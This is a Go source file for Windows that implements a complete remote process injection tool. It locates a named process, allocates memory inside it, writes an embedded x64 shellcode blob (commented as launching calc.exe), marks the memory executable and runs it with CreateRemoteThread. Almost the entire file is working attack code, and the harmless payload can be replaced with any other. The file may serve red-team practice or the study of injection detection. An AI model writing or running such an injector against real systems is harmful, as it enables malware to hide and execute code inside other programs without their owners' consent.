//go:build windows
// +build windows

package main

import (
	"fmt"
	"log"
	"os"
	"strings"
	"unsafe"

	"github.com/zzl/go-win32api/v2/win32" // Used for VirtualAllocEx, VirtualFreeEx, and now CreateRemoteThread
	"golang.org/x/sys/windows"            // Used for other functions like process enumeration, CloseHandle, WaitForSingleObject
)

// Shellcode to launch calc.exe
var shellcode = []byte{
	0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
	0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
	0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
	0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
	0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,
	0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
}

// findProcessPID
func findProcessPID(targetName string) (uint32, error) {
	fmt.Printf("[*] Searching for process: %s\n", targetName)

	handle, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %w", err)
	}
	defer windows.CloseHandle(handle)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(handle, &entry)
	if err != nil {
		return 0, fmt.Errorf("Process32First failed: %w", err)
	}

	for {
		processName := windows.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(processName, targetName) {
			fmt.Printf("[+] Found target process '%s' with PID: %d\n", targetName, entry.ProcessID)
			return entry.ProcessID, nil
		}

		err = windows.Process32Next(handle, &entry)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			return 0, fmt.Errorf("Process32Next failed: %w", err)
		}
	}
	return 0, fmt.Errorf("process '%s' not found", targetName)
}

func main() {
	fmt.Println("[+] WinAPI Process Injection Tool")

	if len(os.Args) < 2 {
		fmt.Printf("Usage: %s <target_process_name.exe>\n", os.Args[0])
		fmt.Println("Example: .\\injector.exe notepad.exe")
		return
	}
	targetProcessName := os.Args[1]

	targetPID, err := findProcessPID(targetProcessName)
	if err != nil {
		log.Fatalf("[-] Failed to find PID: %v", err)
	}

	// hProcess is windows.Handle, which is uintptr. win32.HANDLE is also uintptr.
	// We will cast hProcess to win32.HANDLE where needed for zzl/go-win32api calls.
	hProcess, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|
		windows.PROCESS_QUERY_INFORMATION|
		windows.PROCESS_VM_OPERATION|
		windows.PROCESS_VM_WRITE|
		windows.PROCESS_VM_READ, false, targetPID)
	if err != nil {
		log.Fatalf("[-] OpenProcess failed: %v", err)
	}
	fmt.Printf("[+] Successfully obtained handle: 0x%X\n", hProcess)
	// Defer closing using windows.CloseHandle, as hProcess is windows.Handle
	defer windows.CloseHandle(hProcess)

	shellcodeLen := uintptr(len(shellcode))
	fmt.Printf("[*] Allocating %d bytes in target process (RW)...\n", shellcodeLen)

	// Using win32.VirtualAllocEx from zzl/go-win32api
	remoteAddrPtr, allocErrCode := win32.VirtualAllocEx(
		win32.HANDLE(hProcess), // Cast windows.Handle to win32.HANDLE
		nil,
		shellcodeLen,
		win32.MEM_COMMIT|win32.MEM_RESERVE,
		win32.PAGE_READWRITE,
	)
	if allocErrCode != win32.NO_ERROR {
		log.Fatalf("[-] win32.VirtualAllocEx failed (Error code: %d)", allocErrCode)
	}
	if remoteAddrPtr == nil {
		log.Fatalf("[-] win32.VirtualAllocEx returned nil address.")
	}
	remoteAllocatedAddress := uintptr(remoteAddrPtr) // For use with windows package functions that take uintptr
	fmt.Printf("[+] Allocated %d bytes at remote address: 0x%X\n", shellcodeLen, remoteAllocatedAddress)

	defer func(addrToFree uintptr) {
		if addrToFree == 0 {
			return
		}
		fmt.Println("[*] Freeing remote memory...")
		// Using win32.VirtualFreeEx from zzl/go-win32api
		_, freeErrCode := win32.VirtualFreeEx(
			win32.HANDLE(hProcess),
			unsafe.Pointer(addrToFree), // remoteAddrPtr could also be used here directly
			0,
			win32.MEM_RELEASE,
		)
		if freeErrCode != win32.NO_ERROR {
			log.Printf("[!] Warning: win32.VirtualFreeEx failed (Error code: %d)", freeErrCode)
		} else {
			fmt.Println("[+] Remote memory freed.")
		}
	}(remoteAllocatedAddress)

	var bytesWritten uintptr
	// Using windows.WriteProcessMemory from golang.org/x/sys/windows
	fmt.Printf("[*] Writing %d bytes of shellcode to remote address 0x%X...\n", shellcodeLen, remoteAllocatedAddress)
	err = windows.WriteProcessMemory(hProcess, remoteAllocatedAddress, &shellcode[0], shellcodeLen, &bytesWritten)
	if err != nil {
		log.Fatalf("[-] WriteProcessMemory failed: %v", err)
	}
	if bytesWritten != shellcodeLen {
		log.Fatalf("[-] WriteProcessMemory: incomplete write (%d/%d bytes)", bytesWritten, shellcodeLen)
	}
	fmt.Printf("[+] Successfully wrote %d bytes.\n", bytesWritten)

	var oldProtect uint32
	// Using windows.VirtualProtectEx from golang.org/x/sys/windows
	fmt.Printf("[*] Changing protection of remote address 0x%X to PAGE_EXECUTE_READ (0x%X)...\n", remoteAllocatedAddress, windows.PAGE_EXECUTE_READ)
	err = windows.VirtualProtectEx(hProcess, remoteAllocatedAddress, shellcodeLen, windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		log.Fatalf("[-] VirtualProtectEx failed: %v", err)
	}
	fmt.Printf("[+] Protection changed successfully. Old protection was: 0x%X\n", oldProtect)

	// --- Create Remote Thread using win32.CreateRemoteThread from zzl/go-win32api ---
	fmt.Printf("[*] Creating remote thread with win32.CreateRemoteThread starting at address 0x%X...\n", remoteAllocatedAddress)
	var threadId uint32
	var hWin32Thread win32.HANDLE    // To store the handle from win32.CreateRemoteThread
	var crtErrCode win32.WIN32_ERROR // To store the error code

	// Corrected call to win32.CreateRemoteThread:
	hWin32Thread, crtErrCode = win32.CreateRemoteThread(
		win32.HANDLE(hProcess),                                               // hProcess is windows.Handle, cast to win32.HANDLE
		nil,                                                                  // lpThreadAttributes (*win32.SECURITY_ATTRIBUTES)
		uintptr(0),                                                           // dwStackSize (uintptr)
		win32.LPTHREAD_START_ROUTINE(unsafe.Pointer(remoteAllocatedAddress)), // lpStartAddress (LPTHREAD_START_ROUTINE is unsafe.Pointer)
		unsafe.Pointer(uintptr(0)),                                           // lpParameter (unsafe.Pointer)
		0,                                                                    // dwCreationFlags (uint32)
		&threadId,                                                            // lpThreadId (*uint32)
	)

	if crtErrCode != win32.NO_ERROR {
		log.Fatalf("[-] win32.CreateRemoteThread failed (Error code: %d)", crtErrCode)
	}
	fmt.Printf("[+] Successfully created remote thread with Handle: 0x%X and ID: %d\n", hWin32Thread, threadId)
	fmt.Println("[+] Check the target process for payload execution (e.g., MessageBox)...")

	// WaitForSingleObject and CloseHandle from golang.org/x/sys/windows expect windows.Handle.
	// win32.HANDLE and windows.Handle are both uintptr, so direct use or casting is fine.
	hThreadForWait := windows.Handle(hWin32Thread) // Explicit cast for clarity/safety

	event, err := windows.WaitForSingleObject(hThreadForWait, windows.INFINITE)
	if err != nil {
		log.Printf("[!] Warning: WaitForSingleObject failed: %v", err)
	} else {
		fmt.Printf("[*] Remote thread finished with wait status: 0x%X\n", event)
	}

	errClose := windows.CloseHandle(hThreadForWait)
	if errClose != nil {
		log.Printf("[!] Warning: Failed to close remote thread handle: %v", errClose)
	} else {
		fmt.Println("[*] Remote thread handle closed.")
	}

	fmt.Println("[+] Injection attempt complete.")
}
